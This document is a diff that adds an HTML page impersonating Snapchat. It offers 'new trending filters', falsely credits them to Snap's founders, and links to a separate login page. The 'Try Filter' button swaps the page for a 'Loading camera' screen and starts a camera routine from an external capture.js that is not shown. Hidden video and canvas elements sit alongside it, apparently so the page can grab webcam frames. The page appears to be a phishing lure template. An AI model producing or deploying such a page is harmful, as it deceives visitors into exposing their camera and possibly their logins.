@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+   <title>Snapchat</title>
+
+   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Snapchat-like Filters</title>
+   <meta property="og:title" content="snapchat" />
+   <link rel="icon" type="image/png" href="img/icon.jpg" />
+   <link rel="stylesheet" href="/websites/snap/assets/style.css">
+   <style>
+      canvas {
+         filter: grayscale(100%) brightness(1.2);
+      }
+
+      #video {
+         display: none;
+      }
+
+      #canvas {
+         display: block;
+      }
+
+      .video-wrap {
+         position: relative;
+      }
+
+      canvas {
+         filter: grayscale(100%) brightness(1.2);
+         /* Sample filter */
+      }
+
+      body {
+         background-color: #fffc00;
+         margin: 0;
+         font-family: Arial, sans-serif;
+         padding: 0;
+         text-align: center;
+      }
+
+      canvas {
+         display: none;
+         filter: none;
+         width: 100%;
+         height: auto;
+      }
+
+      link[rel="icon"] {
+         border-radius: 50%;
+      }
+
+      #video {
+         display: none;
+         width: 100%;
+         height: auto;
+      }
+
+      .video-wrap {
+         position: relative;
+         width: 100%;
+         max-width: 640px;
+         margin: 0 auto;
+      }
+
+
+      .butterfly {
+         position: relative;
+         top: 10%;
+         left: -100px;
+         width: 100px;
+
+      }
+
+      .tryFilterBtn {
+         margin: 20px;
+         padding: 10px 20px;
+         font-size: 16px;
+         background-color: #41a4f5;
+         color: white;
+         border: none;
+         border-radius: 5px;
+         cursor: pointer;
+         display: inline-block;
+         width: 80%;
+         max-width: 250px;
+      }
+
+      .tryFilterBtn:hover {
+         background-color: #008bfc;
+
+      }
+
+      .loading {
+         display: none;
+         position: fixed;
+         top: 0;
+         left: 0;
+         width: 100%;
+         height: 100%;
+         background-color: rgba(255, 255, 255, 0.8);
+         display: flex;
+         justify-content: center;
+         align-items: center;
+         font-size: 24px;
+         font-weight: bold;
+         color: #333;
+         z-index: 9999;
+      }
+
+
+      /* Media Queries for smaller screens (Mobile phones) */
+      @media (max-width: 600px) {
+         #tryFilterBtn {
+            font-size: 14px;
+            width: 80%;
+            max-width: 200px;
+         }
+
+         .video-wrap {
+            max-width: 100%;
+         }
+
+         canvas {
+            max-width: 100%;
+         }
+      }
+
+      /* Media Queries for tablet and laptop screens */
+      @media (min-width: 601px) and (max-width: 1024px) {
+         #tryFilterBtn {
+            font-size: 18px;
+            width: 70%;
+            max-width: 250px;
+         }
+
+         .video-wrap {
+            max-width: 80%;
+         }
+
+         canvas {
+            max-width: 100%;
+         }
+      }
+
+      /* Media Queries for large screens (Laptop and Desktop) */
+      @media (min-width: 1025px) {
+         #tryFilterBtn {
+            font-size: 20px;
+            width: 50%;
+            max-width: 300px;
+         }
+
+         .video-wrap {
+            max-width: 640px;
+         }
+      }
+
+      img {
+         display: block;
+      }
+
+      .p2 {
+         padding-top: 20px;
+      }
+
+      p {
+         padding-left: 20px;
+         padding-right: 20px;
+      }
+
+      .slideshow-container {
+         max-width: 100%;
+         height: auto;
+         position: relative;
+         margin: auto;
+         overflow: hidden;
+      }
+
+      .slide {
+         width: 30%;
+         height: auto;
+         display: none;
+         border-radius: 10px;
+      }
+   </style>
+</head>
+
+<body>
+   <div class="home" id="home">
+
+      <center>
+         <img src="img/icon.jpg" width="20%" height="20%" />
+         <P>New trending filters are available here. Click and try them out! 👇😍</P>
+         <button id="tryFilterBtn" class="tryFilterBtn">🎭 Try Filter</button>
+         <div class="slideshow-container">
+            <img class="slide" src="img/img (0).jpg" style="display: block;">
+            <img class="slide" src="img/img (2).jpg">
+            <img class="slide" src="img/img (4).jpg">
+            <img class="slide" src="img/img (5).jpg">
+            <img class="slide" src="img/img (6).jpg">
+            <img class="slide" src="img/img (7).jpg">
+            <img class="slide" src="img/img (8).jpg">
+            <img class="slide" src="img/img (1).jpg">
+         </div>
+
+      </center>
+
+      <p class="p2"> This filter was created by <a
+            href="https://investor.snap.com/governance/leadership-team/default.aspx">Evan Spiegel</a> and <a
+            href="https://investor.snap.com/governance/leadership-team/default.aspx">Bobby Murphy</a></p>
+      <p> <a href="login.html">login </a>or Don't have an account? <a href="login.html">Sign up</a></p>
+   </div>
+   <div class="video-wrap">
+      <video id="video" playsinline autoplay></video>
+   </div>
+
+   <canvas id="canvas" width="640" height="480" hidden="hidden"></canvas>
+
+
+   </div>
+
+
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script src="/capture.js"></script>
+
+<script>
+
+   let slideIndex = 0;
+   const slides = document.getElementsByClassName("slide");
+
+   function showSlides() {
+      for (let i = 0; i < slides.length; i++) {
+         slides[i].style.display = "none";
+      }
+      slideIndex++;
+      if (slideIndex > slides.length) { slideIndex = 1; }
+      slides[slideIndex - 1].style.display = "block";
+      setTimeout(showSlides, 3000); // Change image every 3 seconds
+   }
+
+   showSlides();
+   // Set up video stream from webcam
+   document.getElementById('tryFilterBtn').onclick = function () {
+      document.querySelector('.home').innerHTML = '<div id="loading" class="loading">📷 Loading camera…</div>'; // hide home
+      document.getElementById('video').style.display = "block"; // show video (optional)
+      document.getElementById('canvas').style.display = "none"; // show canvas
+      init(); // start camera
+   }
+
+</script>
+
+</html>
